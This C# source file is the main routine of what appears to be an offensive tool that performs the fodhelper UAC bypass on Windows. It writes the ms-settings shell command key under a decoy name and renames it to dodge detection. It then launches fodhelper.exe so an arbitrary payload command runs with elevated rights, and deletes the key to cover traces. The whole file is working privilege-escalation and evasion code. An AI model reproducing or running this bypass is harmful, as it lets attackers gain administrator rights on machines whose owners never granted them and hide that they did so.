using System;

namespace FODHelperUACBypass_NG
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // Run tests if -test flag is provided
            if (args.Length > 0 && args[0] == "-test")
            {
                TestSyscalls.RunTests();
                return;
            }

            try
            {
                // Use a benign-looking name initially
                string randomSuffix = Guid.NewGuid().ToString("N").Substring(0, 8);
                string fakeKeyPath = $@"Software\Classes\TempApp{randomSuffix}\Shell\Open\command";
                string realKeyPath = @"Software\Classes\ms-settings\Shell\Open\command";
                string payloadCommand = args.Length > 0 ? args[0] : @"C:\Windows\System32\Notepad.exe";

                Console.WriteLine($"[*] Creating benign registry key: TempApp{randomSuffix}...");
                
                // Create registry key with benign name using NtCreateKey
                if (Helpers.CreateRegistryKey(fakeKeyPath, out IntPtr keyHandle, out uint status))
                {
                    Console.WriteLine("[+] Benign registry key created successfully.");

                    // Set DelegateExecute value
                    if (Helpers.SetRegistryValue(keyHandle, "DelegateExecute", ""))
                    {
                        Console.WriteLine("[+] DelegateExecute value set.");
                    }
                    else
                    {
                        Console.WriteLine("[-] Failed to set DelegateExecute value.");
                    }

                    // Set default value (command to execute)
                    if (Helpers.SetRegistryValue(keyHandle, "", payloadCommand))
                    {
                        Console.WriteLine("[+] Default value set to payload command.");
                    }
                    else
                    {
                        Console.WriteLine("[-] Failed to set default value.");
                    }

                    // Close the key handle
                    Native.NtClose(keyHandle);
                }
                else
                {
                    Console.WriteLine($"[-] Failed to create registry key. NTSTATUS: 0x{status:X8} ({Helpers.GetNtStatusMessage(status)})");
                    return;
                }

                // Now atomically rename to the target key using Win32 RegRenameKey API
                Console.WriteLine($"[*] Renaming TempApp{randomSuffix} -> ms-settings (via RegRenameKey)...");
                string parentPath = $@"Software\Classes\TempApp{randomSuffix}";
                if (Helpers.RenameRegistryKey(parentPath, "ms-settings"))
                {
                    Console.WriteLine("[+] Registry key renamed successfully!");
                }
                else
                {
                    Console.WriteLine("[-] Failed to rename registry key.");
                    // Try to cleanup the benign key
                    Helpers.DeleteRegistryKey(fakeKeyPath);
                    return;
                }

                // Wait 10 seconds using NtDelayExecution
                Console.WriteLine("[*] Waiting 10 seconds...");
                Helpers.Sleep(10000);

                // Start fodhelper.exe using CreateProcess
                Console.WriteLine("[*] Starting fodhelper.exe...");
                if (Helpers.StartProcess("fodhelper.exe", out string error))
                {
                    Console.WriteLine("[+] Fodhelper started successfully.");
                }
                else
                {
                    Console.WriteLine($"[-] Failed to start fodhelper.exe: {error}");
                }

                // Wait 5 seconds
                Console.WriteLine("[*] Waiting 5 seconds...");
                Helpers.Sleep(5000);

                // Delete registry key using NtDeleteKey
                Console.WriteLine("[*] Removing registry key via indirect syscalls...");
                string parentDeletePath = @"Software\Classes\ms-settings";
                if (Helpers.DeleteRegistryKey(parentDeletePath))
                {
                    Console.WriteLine("[+] Registry key removed successfully.");
                }
                else
                {
                    Console.WriteLine("[-] Failed to remove registry key (this is normal if fodhelper already cleaned it).");
                }

                Console.WriteLine("[+] Operation completed.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                Console.WriteLine($"[!] Stack trace: {ex.StackTrace}");
            }
        }
    }
}
